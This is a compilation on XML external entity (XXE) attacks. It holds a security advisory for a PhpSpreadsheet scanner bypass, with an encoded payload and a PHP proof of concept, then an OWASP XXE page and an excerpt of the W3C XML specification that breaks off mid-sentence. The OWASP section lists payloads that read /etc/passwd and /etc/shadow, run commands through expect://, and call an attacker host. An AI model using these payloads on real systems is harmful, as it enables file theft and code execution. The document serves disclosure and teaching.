## Package

phpoffice/phpspreadsheet
([Composer](/advisories?query=ecosystem%3Acomposer))

## Affected versions

< 1.29.4
>= 2.0.0, < 2.1.3
>= 2.2.0, < 2.3.2
>= 3.3.0, < 3.4.0

## Patched versions

1.29.4
2.1.3

## Description

### Summary

The [XmlScanner class](https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php) has a [scan](https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L72) method which should prevent XXE attacks.

However, the regexes used in the `scan` method and the [findCharSet](https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L51) method can be bypassed by using UCS-4 and encoding guessing as described in <https://www.w3.org/TR/xml/#sec-guessing-no-ext-info>.

### Details

The `scan` method converts the input in the UTF-8 encoding if it is not already in the UTF-8 encoding with the [`toUtf8` method](https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L76).

Then, the `scan` method uses a [regex](https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L79) which would also work with 16-bit encoding.

However, the regexes from the [findCharSet](https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L51) method, which is used for determining the current encoding can be bypassed by using an encoding which has more than 8 bits, since the regex does not expect null bytes, and the XML library will also autodetect the encoding as described in <https://www.w3.org/TR/xml/#sec-guessing-no-ext-info>.

A payload for the `workbook.xml` file can for example be created with [CyberChef](https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-32BE%20(12001)')&input=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTE2IiBzdGFuZGFsb25lPSJ5ZXMiPz4KPCFET0NUWVBFIG1lc3NhZ2UgWwogICAgPCFFTlRJVFkgJSBleHQgU1lTVEVNICJodHRwOi8vMTI3LjAuMC4xOjEyMzQ1L2V4dC5kdGQiPgogICAgJWV4dDsKXT4KPHdvcmtib29rIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5vcGVueG1sZm9ybWF0cy5vcmcvc3ByZWFkc2hlZXRtbC8yMDA2L21haW4iIHhtbG5zOnI9Imh0dHA6Ly9zY2hlbWFzLm9wZW54bWxmb3JtYXRzLm9yZy9vZmZpY2VEb2N1bWVudC8yMDA2L3JlbGF0aW9uc2hpcHMiPjxmaWxlVmVyc2lvbiBhcHBOYW1lPSJDYWxjIi8%2BPHdvcmtib29rUHIgYmFja3VwRmlsZT0iZmFsc2UiIHNob3dPYmplY3RzPSJhbGwiIGRhdGUxOTA0PSJmYWxzZSIvPjx3b3JrYm9va1Byb3RlY3Rpb24vPjxib29rVmlld3M%2BPHdvcmtib29rVmlldyBzaG93SG9yaXpvbnRhbFNjcm9sbD0idHJ1ZSIgc2hvd1ZlcnRpY2FsU2Nyb2xsPSJ0cnVlIiBzaG93U2hlZXRUYWJzPSJ0cnVlIiB4V2luZG93PSIwIiB5V2luZG93PSIwIiB3aW5kb3dXaWR0aD0iMTYzODQiIHdpbmRvd0hlaWdodD0iODE5MiIgdGFiUmF0aW89IjUwMCIgZmlyc3RTaGVldD0iMCIgYWN0aXZlVGFiPSIwIi8%2BPC9ib29rVmlld3M%2BPHNoZWV0cz48c2hlZXQgbmFtZT0iU2hlZXQxIiBzaGVldElkPSIxIiBzdGF0ZT0idmlzaWJsZSIgcjppZD0icklkMiIvPjwvc2hlZXRzPjxjYWxjUHIgaXRlcmF0ZUNvdW50PSIxMDAiIHJlZk1vZGU9IkExIiBpdGVyYXRlPSJmYWxzZSIgaXRlcmF0ZURlbHRhPSIwLjAwMSIvPjxleHRMc3Q%2BPGV4dCB4bWxuczpsb2V4dD0iaHR0cDovL3NjaGVtYXMubGlicmVvZmZpY2Uub3JnLyIgdXJpPSJ7NzYyNkM4NjItMkExMy0xMUU1LUIzNDUtRkVGRjgxOUNEQzlGfSI%2BPGxvZXh0OmV4dENhbGNQciBzdHJpbmdSZWZTeW50YXg9IkNhbGNBMSIvPjwvZXh0PjwvZXh0THN0Pjwvd29ya2Jvb2s%2B.).

If you open an Excel file containing the payload from the link above stored in the `workbook.xml` file with PhpSpreadsheet, you will receive an HTTP request on `127.0.0.1:12345`. You can test that an HTTP request is created by running the `nc -nlvp 12345` command before opening the file containing the payload with PhpSpreadsheet.

### PoC

* Create a new folder.
* Run the `composer require phpoffice/phpspreadsheet` command in the new folder.
* Create an `index.php` file in that folder with the following content:

```
<?php
require 'vendor/autoload.php';

use PhpOffice\PhpSpreadsheet\Spreadsheet;
use PhpOffice\PhpSpreadsheet\Writer\Xlsx;

$spreadsheet = new Spreadsheet();

$inputFileType = 'Xlsx';
$inputFileName = './payload.xlsx';

/**  Create a new Reader of the type defined in $inputFileType  **/
$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader($inputFileType);
/**  Advise the Reader that we only want to load cell data  **/
$reader->setReadDataOnly(true);

$worksheetData = $reader->listWorksheetInfo($inputFileName);

foreach ($worksheetData as $worksheet) {

$sheetName = $worksheet['worksheetName'];

echo "<h4>$sheetName</h4>";
/**  Load $inputFileName to a Spreadsheet Object  **/
$reader->setLoadSheetsOnly($sheetName);
$spreadsheet = $reader->load($inputFileName);

$worksheet = $spreadsheet->getActiveSheet();
print_r($worksheet->toArray());

}
```

* Run the following command: `php -S 127.0.0.1:8080`
* Add the [payload.xlsx](https://github.com/user-attachments/files/17334157/payload.xlsx) file, which contains a payload similar to the payload from the details section, but with the URL `https://webhook.site/65744200-63d2-43a2-a6a0-cca8d6b0d50a` instead of the `http://127.0.0.1:12345/ext.dtd` URL, in the folder and open <https://127.0.0.1:8080> in a browser. You will see an HTTP request on <https://webhook.site/#!/view/65744200-63d2-43a2-a6a0-cca8d6b0d50a>.

# XML External Entity (XXE) Processing

Thank you for visiting OWASP.org. We have migrated our community to a new web platform and regretably the content for this page needed to be programmatically ported from its previous wiki page. There’s still some work to be done.

This is an example of a Project or Chapter Page.

## NVD Categorization

> [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html): The software processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output.

## Description

An *XML External Entity* attack is a type of attack against an
application that parses XML input. This attack occurs when **XML input
containing a reference to an external entity is processed by a weakly
configured XML parser**. This attack may lead to the disclosure of
confidential data, denial of service, server side request forgery, port
scanning from the perspective of the machine where the parser is
located, and other system impacts.

The [XML 1.0 standard](http://www.w3.org/TR/REC-xml/) defines the
structure of an XML document. The standard defines a concept called an
entity, which is a storage unit of some type. There are a few different
types of entities, [external general/parameter parsed
entity](http://www.w3.org/TR/REC-xml/#sec-external-ent) often shortened
to **external entity**, that can access local or remote content via a
declared system identifier. The system identifier is assumed to be a URI
that can be dereferenced (accessed) by the XML processor when processing
the entity. The XML processor then replaces occurrences of the named
external entity with the contents dereferenced by the system identifier.
If the system identifier contains tainted data and the XML processor
dereferences this tainted data, the XML processor may disclose
confidential information normally not accessible by the application.
Similar attack vectors apply the usage of external DTDs, external
stylesheets, external schemas, etc. which, when included, allow similar
external resource inclusion style attacks.

Attacks can include disclosing local files, which may contain sensitive
data such as passwords or private user data, using file: schemes or
relative paths in the system identifier. Since the attack occurs
relative to the application processing the XML document, an attacker may
use this trusted application to pivot to other internal systems,
possibly disclosing other internal content via http(s) requests or
launching a [CSRF](CSRF "wikilink") attack to any unprotected internal
services. In some situations, an XML processor library that is
vulnerable to client-side memory corruption issues may be exploited by
dereferencing a malicious URI, possibly allowing arbitrary code
execution under the application account. Other attacks can access local
resources that may not stop returning data, possibly impacting
application availability if too many threads or processes are not
released.

Note that the application does not need to explicitly return the
response to the attacker for it to be vulnerable to information
disclosures. An attacker can leverage DNS information to exfiltrate data
through subdomain names to a DNS server that they controls.

## Risk Factors

* The application parses XML documents.
* Tainted data is allowed within the system identifier portion of the
  entity, within the [document type declaration](http://www.w3.org/TR/REC-xml/#sec-prolog-dtd) (DTD).
* The XML processor is configured to validate and process the DTD.
* The XML processor is configured to resolve external entities within
  the DTD.

## Examples

The examples below are from [Testing for XML Injection (OWASP-DV-008)](Testing_for_XML_Injection_%5C%28OWASP-DV-008%5C%29 "wikilink").

### Accessing a local resource that may not return

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///dev/random" >]>
<foo>&xxe;</foo>

```
## Remote Code Execution

If fortune is on our side, and the PHP “expect” module is loaded, we can
get RCE. Let’s modify the payload

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo
  [<!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
  <user>`&xxe;`</user>
  <pass>`mypass`</pass>
</creds>

```
### Disclosing /etc/passwd or other targeted files

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>

```

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
<foo>&xxe;</foo>

```

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
<foo>&xxe;</foo>

```

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]>
<foo>&xxe;</foo>

```
## Related [Attacks](https://owasp.org/www-community/attacks/)

* [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
* [Blind SQL Injection](Blind_SQL_Injection "wikilink")

## Related [Vulnerabilities](https://owasp.org/www-community/vulnerabilities/)

* [Missing XML Validation](Missing_XML_Validation "wikilink")

## Related [Controls](https://owasp.org/www-community/controls/)

Since the whole XML document is communicated from an untrusted client,
it’s not usually possible to selectively
[validate](Input_Validation "wikilink") or escape tainted data within
the system identifier in the DTD. Therefore, the XML processor should be
configured to use a local static DTD and disallow any declared DTD
included in the XML document.

Detailed guidance on how to disable XXE processing, or otherwise defend
against XXE attacks is presented in the [XML External Entity (XXE) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html).

## Abstract

The Extensible Markup Language (XML) is a subset of SGML that is completely
described in this document. Its goal is to enable generic SGML to be served,
received, and processed on the Web in the way that is now possible with HTML.
XML has been designed for ease of implementation and for interoperability
with both SGML and HTML.

## Status of this Document

*This section describes the status of this document at the time of its publication.
Other documents may supersede this document. A list of current W3C publications and the
latest revision of this technical report can be found in the [W3C technical reports index](https://www.w3.org/TR/) at
http://www.w3.org/TR/.*

This document specifies a syntax created by subsetting an existing, widely
used international text processing standard (Standard Generalized Markup Language,
ISO 8879:1986(E) as amended and corrected) for use on the World Wide Web.
It is a product of the [XML Core Working Group](https://www.w3.org/XML/Core/)
as part of the [XML Activity](https://www.w3.org/XML/Activity).
The English version of this specification is the only normative version. However,
for translations of this document, see [http://www.w3.org/2003/03/Translations/byTechnology?technology=xml](https://www.w3.org/2003/03/Translations/byTechnology?technology=xml).

This document is a [W3C Recommendation](https://www.w3.org/2005/10/Process-20051014/tr.html#q74). This fifth edition is *not* a new version of XML. As a convenience to readers,
it incorporates the changes dictated by the accumulated errata (available at
[http://www.w3.org/XML/xml-V10-4e-errata](https://www.w3.org/XML/xml-V10-4e-errata)) to the [Fourth
Edition of XML 1.0, dated 16 August 2006](https://www.w3.org/TR/2006/REC-xml-20060816/). In particular, erratum [[E09]](https://www.w3.org/XML/xml-V10-4e-errata#E09)
relaxes the restrictions on element and attribute names, thereby providing in XML 1.0 the major end user benefit
currently achievable only by using XML
1.1. As a consequence, many possible
documents which were not well-formed according to previous editions of this
specification are now well-formed, and previously invalid documents
using the newly-allowed name characters in, for example, ID
attributes, are now valid.

This edition supersedes the previous [W3C Recommendation
of 16 August 2006](https://www.w3.org/TR/2006/REC-xml-20060816/).

Please report errors in this document to
the public xml-editor@w3.org mail list; public
[archives](http://lists.w3.org/Archives/Public/xml-editor/) are available. For the convenience of readers,
an [XHTML version with color-coded revision indicators](REC-xml-20081126-review.html) is
also provided; this version highlights each change due to an erratum published in the
[errata
list](https://www.w3.org/XML/xml-V10-4e-errata) for the previous edition, together with a link to the particular
erratum in that list. Most of the
errata in the list provide a rationale for the change. The errata
list for this fifth edition is available at [http://www.w3.org/XML/xml-V10-5e-errata](https://www.w3.org/XML/xml-V10-5e-errata).

An implementation report is available at [http://www.w3.org/XML/2008/01/xml10-5e-implementation.html](https://www.w3.org/XML/2008/01/xml10-5e-implementation.html).
A [Test Suite](https://www.w3.org/XML/Test/) is maintained to help assessing conformance to this specification.

This document has been reviewed by W3C Members, by software developers, and by other W3C groups and interested parties, and is endorsed by the Director as a W3C Recommendation. It is a stable document and may be used as reference material or cited from another document. W3C's role in making the Recommendation is to draw attention to the specification and to promote its widespread deployment. This enhances the functionality and interoperability of the Web.

W3C maintains a [public list of
any patent disclosures](https://www.w3.org/2002/08/xmlcore-IPR-statements) made in connection with the deliverables of
the group; that page also includes instructions for disclosing a patent.
An individual who has actual knowledge of a patent which the individual
believes contains [Essential
Claim(s)](https://www.w3.org/Consortium/Patent-Policy-20040205/#def-essential) must disclose the information in accordance with

## 1 Introduction

Extensible Markup Language, abbreviated XML, describes a class of data
objects called [XML documents](#dt-xml-doc "XML Document") and partially
describes the behavior of computer programs which process them. XML is an
application profile or restricted form of SGML, the Standard Generalized Markup
Language [[ISO 8879]](#ISO8879). By construction, XML documents are conforming
SGML documents.

XML documents are made up of storage units called [entities](#dt-entity "Entity"),
which contain either parsed or unparsed data. Parsed data is made up of [characters](#dt-character "Character"), some of which form [character
data](#dt-chardata "Character Data"), and some of which form [markup](#dt-markup "Markup").
Markup encodes a description of the document's storage layout and logical
structure. XML provides a mechanism to impose constraints on the storage layout
and logical structure.

[Definition: A software module called
an **XML processor** is used to read XML documents and provide access
to their content and structure.]
[Definition: It
is assumed that an XML processor is doing its work on behalf of another module,
called the **application**.] This specification describes
the required behavior of an XML processor in terms of how it must read XML
data and the information it must provide to the application.

### 1.1 Origin and Goals

XML was developed by an XML Working Group (originally known as the SGML
Editorial Review Board) formed under the auspices of the World Wide Web Consortium
(W3C) in 1996. It was chaired by Jon Bosak of Sun Microsystems with the active
participation of an XML Special Interest Group (previously known as the SGML
Working Group) also organized by the W3C. The membership of the XML Working
Group is given in an appendix. Dan Connolly served as the Working Group's contact with
the W3C.

The design goals for XML are:

1. XML shall be straightforwardly usable over the Internet.
2. XML shall support a wide variety of applications.
3. XML shall be compatible with SGML.
4. It shall be easy to write programs which process XML documents.
5. The number of optional features in XML is to be kept to the absolute
   minimum, ideally zero.
6. XML documents should be human-legible and reasonably clear.
7. The XML design should be prepared quickly.
8. The design of XML shall be formal and concise.
9. XML documents shall be easy to create.
10. Terseness in XML markup is of minimal importance.

This specification, together with associated standards (Unicode [[Unicode]](#Unicode)
and ISO/IEC 10646 [[ISO/IEC 10646]](#ISO10646) for characters, Internet BCP 47
[[IETF BCP 47]](#RFC1766) and the Language Subtag Registry [[IANA-LANGCODES]](#IANA-LANGCODES) for language
identification tags), provides
all the information necessary to understand XML Version 1.0 and
construct computer programs to process it.

This version of the XML specification may be distributed freely, as long as
all text and legal notices remain intact.

### 1.2 Terminology

The terminology used to describe XML documents is defined in the body of
this specification. The key words *MUST*, *MUST NOT*,
*REQUIRED*, *SHALL*, *SHALL NOT*,
*SHOULD*, *SHOULD NOT*, *RECOMMENDED*,
*MAY*, and *OPTIONAL*, when *EMPHASIZED*,
are to be interpreted as described in [[IETF RFC 2119]](#rfc2119). In addition, the terms defined
in the following list are used in building
those definitions and in describing the actions of an XML processor:

error

[Definition: A violation of the rules of this specification;
results are undefined. Unless otherwise specified, failure to observe a prescription of this specification indicated by one of the keywords *MUST*, *REQUIRED*, *MUST NOT*, *SHALL* and *SHALL NOT* is an error. Conforming software *MAY* detect and report an error
and *MAY* recover from it.]

fatal error

[Definition: An error which a conforming [XML processor](#dt-xml-proc "XML Processor")
*MUST* detect and report to the application.
After encountering a fatal error, the processor *MAY* continue processing the
data to search for further errors and *MAY* report such errors to the application.
In order to support correction of errors, the processor *MAY* make unprocessed
data from the document (with intermingled character data and markup) available
to the application. Once a fatal error is detected, however, the processor
*MUST NOT* continue normal processing (i.e., it *MUST NOT* continue to pass character
data and information about the document's logical structure to the application
in the normal way).]

at user option

[Definition: Conforming software
*MAY* or *MUST* (depending on the modal verb in the sentence) behave as described;
if it does, it *MUST* provide users a means to enable or disable the behavior
described.]

validity constraint

[Definition: A rule which applies to
all [valid](#dt-valid "Validity") XML documents. Violations of validity
constraints are errors; they *MUST*, at user option, be reported by [validating XML processors](#dt-validating "Validating Processor").]

well-formedness constraint

[Definition: A rule which applies
to all [well-formed](#dt-wellformed "Well-Formed") XML documents. Violations
of well-formedness constraints are [fatal errors](#dt-fatal "Fatal Error").]

match

[Definition: (Of strings or names:) Two strings
or names being compared are identical. Characters with multiple possible
representations in ISO/IEC 10646 (e.g. characters with both precomposed and
base+diacritic forms) match only if they have the same representation in both
strings. No
case folding is performed. (Of strings and rules in the grammar:) A string
matches a grammatical production if it belongs to the language generated by
that production. (Of content and content models:) An element matches its declaration
when it conforms in the fashion described in the constraint **[VC: [Element Valid](#elementvalid)]**.]

for compatibility

[Definition: Marks
a sentence describing a feature of XML included solely to ensure
that XML remains compatible with SGML.]

for interoperability

[Definition: Marks
a sentence describing a non-binding recommendation included to increase
the chances that XML documents can be processed by the existing installed
base of SGML processors which predate the WebSGML Adaptations Annex to ISO 8879.]

## 2 Documents

[Definition: A data object is an **XML
document** if it is [well-formed](#dt-wellformed "Well-Formed"),
as defined in this specification. In addition, the XML document is
[valid](#dt-valid "Validity") if it meets certain further constraints.]

Each XML document has both a logical and a physical structure. Physically,
the document is composed of units called [entities](#dt-entity "Entity").
An entity may
[refer](#dt-entref "Entity Reference") to other entities to
cause their inclusion in the document. A document begins in a "root"
or [document entity](#dt-docent "Document Entity"). Logically, the document
is composed of declarations, elements, comments, character references, and
processing instructions, all of which are indicated in the document by explicit
markup. The logical and physical structures *MUST* nest properly, as described
in [**4.3.2 Well-Formed Parsed Entities**](#wf-entities).

### 2.1 Well-Formed XML Documents

[Definition: A textual object is a **well-formed**
XML document if:]

1. Taken as a whole, it matches the production labeled [document](#NT-document).
2. It meets all the well-formedness constraints given in this specification.
3. Each of the [parsed entities](#dt-parsedent "Text Entity")
   which is referenced directly or indirectly within the document is [well-formed](#dt-wellformed "Well-Formed").

##### Document

| [1] | `document` | ::= | `[prolog](#NT-prolog) [element](#NT-element) [Misc](#NT-Misc)*` |
| --- | --- | --- | --- |

Matching the [document](#NT-document) production implies that:

1. It contains one or more [elements](#dt-element "Element").
2. [Definition: There is exactly one element,
   called the **root**, or document element, no part of which appears
   in the [content](#dt-content "Content") of any other element.] For
   all other elements, if the [start-tag](#dt-stag "Start-Tag") is in
   the content of another element, the [end-tag](#dt-etag "End Tag")
   is in the content of the same element. More simply stated, the elements,
   delimited by start- and end-tags, nest properly within each other.

[Definition: As a consequence of this,
for each non-root element `C` in the document, there is one other element `P`
in the document such that `C` is in the content of `P`, but
is not in the content of any other element that is in the content of `P`. `P`
is referred to as the **parent** of `C`, and `C` as
a **child** of `P`.]

### 2.2 Characters

[Definition: A parsed entity contains **text**,
a sequence of [characters](#dt-character "Character"), which may
represent markup or character data.]
[Definition: A **character**
is an atomic unit of text as specified by ISO/IEC 10646:2000 [[ISO/IEC 10646]](#ISO10646). Legal characters are tab, carriage
return, line feed, and the legal characters
of Unicode and ISO/IEC 10646. The
versions of these standards cited in [**A.1 Normative References**](#sec-existing-stds) were
current at the time this document was prepared. New characters may be added
to these standards by amendments or new editions. Consequently, XML processors
*MUST* accept any character in the range specified for [Char](#NT-Char).
]

##### Character Range

| [2] | `Char` | ::= | `#x9 | #xA | #xD | [#x20-#xD7FF] | [#xE000-#xFFFD] | [#x10000-#x10FFFF]` | */\* any Unicode character, excluding the surrogate blocks, FFFE, and FFFF. \*/* |
| --- | --- | --- | --- | --- |

The mechanism for encoding character code points into bit patterns may
vary from entity to entity. All XML processors *MUST* accept the UTF-8 and UTF-16
encodings of Unicode [[Unicode]](#Unicode);
the mechanisms for signaling which of the two is in use,
or for bringing other encodings into play, are discussed later, in [**4.3.3 Character Encoding in Entities**](#charencoding).

**Note:**

Document authors are encouraged to avoid
"compatibility characters", as defined
in section 2.3 of [[Unicode]](#Unicode). The characters defined in the following ranges are also
discouraged. They are either control characters or permanently undefined Unicode
characters:

```
[#x7F-#x84], [#x86-#x9F], [#xFDD0-#xFDEF],
[#x1FFFE-#x1FFFF], [#x2FFFE-#x2FFFF], [#x3FFFE-#x3FFFF],

### 2.3 Common Syntactic Constructs

This section defines some symbols used widely in the grammar.

[S](#NT-S) (white space) consists of one or more space (#x20)
characters, carriage returns, line feeds, or tabs.

##### White Space

| [3] | `S` | ::= | `(#x20 | #x9 | #xD | #xA)+` |
| --- | --- | --- | --- |

**Note:**

The presence of #xD in the above production is
maintained purely for backward compatibility with the
[First Edition](https://www.w3.org/TR/1998/REC-xml-19980210).
As explained in [**2.11 End-of-Line Handling**](#sec-line-ends),
all #xD characters literally present in an XML document
are either removed or replaced by #xA characters before
any other processing is done. The only way to get a #xD character to match this production is to
use a character reference in an entity value literal.

An [Nmtoken](#NT-Nmtoken) (name token) is any mixture of name
characters.

[Definition: A [Name](#NT-Name) is an [Nmtoken](#NT-Nmtoken) with a restricted set of initial characters.] Disallowed initial characters for [Names](#NT-Name) include digits, diacritics, the full stop and the hyphen.

Names beginning with the string "`xml`",
or with any string which would match `(('X'|'x') ('M'|'m') ('L'|'l'))`,
are reserved for standardization in this or future versions of this specification.

**Note:**

The
Namespaces in XML Recommendation [[XML Names]](#xml-names) assigns a meaning
to names containing colon characters. Therefore, authors should not use the
colon in XML names except for namespace purposes, but XML processors must
accept the colon as a name character.

The first character of a [Name](#NT-Name) *MUST* be a [NameStartChar](#NT-NameStartChar), and any
other characters *MUST* be [NameChars](#NT-NameChar); this mechanism is used to
prevent names from beginning with European (ASCII) digits or with
basic combining characters. Almost all characters are permitted in
names, except those which either are or reasonably could be used as
delimiters. The intention is to be inclusive rather than exclusive,
so that writing systems not yet encoded in Unicode can be used in
XML names. See [**J Suggestions for XML Names**](#sec-suggested-names) for suggestions on the creation of
names.

Document authors are encouraged to use names which are
meaningful words or combinations of words in natural languages, and
to avoid symbolic or white space characters in names. Note that
COLON, HYPHEN-MINUS, FULL STOP (period), LOW LINE (underscore), and
MIDDLE DOT are explicitly permitted.

The ASCII symbols and punctuation marks, along with a fairly
large group of Unicode symbol characters, are excluded from names
because they are more useful as delimiters in contexts where XML
names are used outside XML documents; providing this group gives
those contexts hard guarantees about what *cannot* be part of
an XML name. The character #x037E, GREEK QUESTION MARK, is excluded
because when normalized it becomes a semicolon, which could change
the meaning of entity references.

##### Names and Tokens

| [4] | `NameStartChar` | ::= | `":" | [A-Z] | "_" | [a-z] | [#xC0-#xD6] | [#xD8-#xF6] | [#xF8-#x2FF] | [#x370-#x37D] | [#x37F-#x1FFF] | [#x200C-#x200D] | [#x2070-#x218F] | [#x2C00-#x2FEF] | [#x3001-#xD7FF] | [#xF900-#xFDCF] | [#xFDF0-#xFFFD] | [#x10000-#xEFFFF]` |
| --- | --- | --- | --- |
| [4a] | `NameChar` | ::= | `[NameStartChar](#NT-NameStartChar) | "-" | "." | [0-9] | #xB7 | [#x0300-#x036F] | [#x203F-#x2040]` |
| --- | --- | --- | --- |
| [5] | `Name` | ::= | `[NameStartChar](#NT-NameStartChar) ([NameChar](#NT-NameChar))*` |
| --- | --- | --- | --- |
| [6] | `Names` | ::= | `[Name](#NT-Name) (#x20 [Name](#NT-Name))*` |
| --- | --- | --- | --- |
| [7] | `Nmtoken` | ::= | `([NameChar](#NT-NameChar))+` |
| --- | --- | --- | --- |
| [8] | `Nmtokens` | ::= | `[Nmtoken](#NT-Nmtoken) (#x20 [Nmtoken](#NT-Nmtoken))*` |
| --- | --- | --- | --- |

**Note:**

The [Names](#NT-Names)
and [Nmtokens](#NT-Nmtokens) productions are used to define the validity
of tokenized attribute values after normalization (see [**3.3.1 Attribute Types**](#sec-attribute-types)).

Literal data is any quoted string not containing the quotation mark used
as a delimiter for that string. Literals are used for specifying the content
of internal entities ([EntityValue](#NT-EntityValue)), the values
of attributes ([AttValue](#NT-AttValue)), and external identifiers
([SystemLiteral](#NT-SystemLiteral)). Note that a [SystemLiteral](#NT-SystemLiteral)
can be parsed without scanning for markup.

##### Literals

| [9] | `EntityValue` | ::= | `'"' ([^%&"] | [PEReference](#NT-PEReference) | [Reference](#NT-Reference))* '"'` |
| --- | --- | --- | --- |
|  |  |  | `|  "'" ([^%&'] | [PEReference](#NT-PEReference) | [Reference](#NT-Reference))* "'"` |
| [10] | `AttValue` | ::= | `'"' ([^<&"] | [Reference](#NT-Reference))* '"'` |
| --- | --- | --- | --- |
|  |  |  | `|  "'" ([^<&'] | [Reference](#NT-Reference))* "'"` |
| [11] | `SystemLiteral` | ::= | `('"' [^"]* '"') | ("'" [^']* "'")` |
| --- | --- | --- | --- |
| [12] | `PubidLiteral` | ::= | `'"' [PubidChar](#NT-PubidChar)* '"' | "'" ([PubidChar](#NT-PubidChar) - "'")* "'"` |
| --- | --- | --- | --- |
| [13] | `PubidChar` | ::= | `#x20 | #xD | #xA | [a-zA-Z0-9] | [-'()+,./:=?;!*#@$_%]` |
| --- | --- | --- | --- |

**Note:**

Although
the [EntityValue](#NT-EntityValue) production allows the definition
of a general entity consisting of a single explicit `<` in the literal
(e.g., `<!ENTITY mylt "<">`), it is strongly advised to avoid
this practice since any reference to that entity will cause a well-formedness
error.

### 2.4 Character Data and Markup

[Text](#dt-text "Text") consists of intermingled [character data](#dt-chardata "Character Data") and markup. [Definition:
**Markup** takes the form of [start-tags](#dt-stag "Start-Tag"), [end-tags](#dt-etag "End Tag"), [empty-element tags](#dt-empty "Empty"), [entity references](#dt-entref "Entity Reference"), [character
references](#dt-charref "Character Reference"), [comments](#dt-comment "Comment"), [CDATA section](#dt-cdsection "CDATA Section") delimiters, [document
type declarations](#dt-doctype "Document Type Declaration"), [processing instructions](#dt-pi "Processing instruction"), [XML declarations](#NT-XMLDecl), [text declarations](#NT-TextDecl),
and any white space that is at the top level of the document entity (that
is, outside the document element and not inside any other markup).]

[Definition: All text that is not markup
constitutes the **character data** of the document.]

The ampersand character (&) and the left angle bracket (<) *MUST NOT* appear
in their literal form, except when used as markup delimiters, or
within a [comment](#dt-comment "Comment"), a [processing
instruction](#dt-pi "Processing instruction"), or a [CDATA section](#dt-cdsection "CDATA Section").
If they are needed elsewhere, they *MUST* be [escaped](#dt-escape "escape")
using either [numeric character references](#dt-charref "Character Reference")
or the strings "
`&amp;`
" and "
`&lt;`
"
respectively. The right angle bracket (>) may be represented using the string "
`&gt;`
",
and *MUST*, [for compatibility](#dt-compat "For Compatibility"), be escaped
using either "
`&gt;`
" or a character reference when it
appears in the string "
`]]>`
" in content, when
that string is not marking the end of a [CDATA
section](#dt-cdsection "CDATA Section").

In the content of elements, character data is any string of characters
which does not contain the start-delimiter of any markup and does not include the CDATA-section-close
delimiter, "
`]]>`
". In a CDATA section,
character data is any string of characters not including the CDATA-section-close
delimiter, "
`]]>`
".

To allow attribute values to contain both single and double quotes, the
apostrophe or single-quote character (') may be represented as "
`&apos;`
",
and the double-quote character (") as "
`&quot;`
".

##### Character Data

| [14] | `CharData` | ::= | `[^<&]* - ([^<&]* ']]>' [^<&]*)` |
| --- | --- | --- | --- |

### 2.5 Comments

[Definition:
**Comments** may appear
anywhere in a document outside other [markup](#dt-markup "Markup");
in addition, they may appear within the document type declaration at places
allowed by the grammar. They are not part of the document's [character
data](#dt-chardata "Character Data"); an XML processor *MAY*, but need not, make it possible for an
application to retrieve the text of comments. [For
compatibility](#dt-compat "For Compatibility"), the string "
`--`
" (double-hyphen)
*MUST NOT* occur within comments.] Parameter
entity references *MUST NOT* be recognized within comments.

##### Comments

| [15] | `Comment` | ::= | `'<!--' (([Char](#NT-Char) - '-') | ('-' ([Char](#NT-Char) - '-')))* '-->'` |
| --- | --- | --- | --- |

An example of a comment:

```
<!-- declarations for <head> & <body> -->
```

Note
that the grammar does not allow a comment ending in `--->`. The
following example is *not* well-formed.

```
<!-- B+, B, or B--->
```
### 2.6 Processing Instructions

[Definition:
**Processing instructions**
(PIs) allow documents to contain instructions for applications.]

##### Processing Instructions

| [16] | `PI` | ::= | `'<?' [PITarget](#NT-PITarget) ([S](#NT-S) ([Char](#NT-Char)* - ([Char](#NT-Char)* '?>' [Char](#NT-Char)*)))? '?>'` |
| --- | --- | --- | --- |
| [17] | `PITarget` | ::= | `[Name](#NT-Name) - (('X' | 'x') ('M' | 'm') ('L' | 'l'))` |
| --- | --- | --- | --- |

PIs are not part of the document's [character
data](#dt-chardata "Character Data"), but *MUST* be passed through to the application. The PI begins
with a target ([PITarget](#NT-PITarget)) used to identify the application
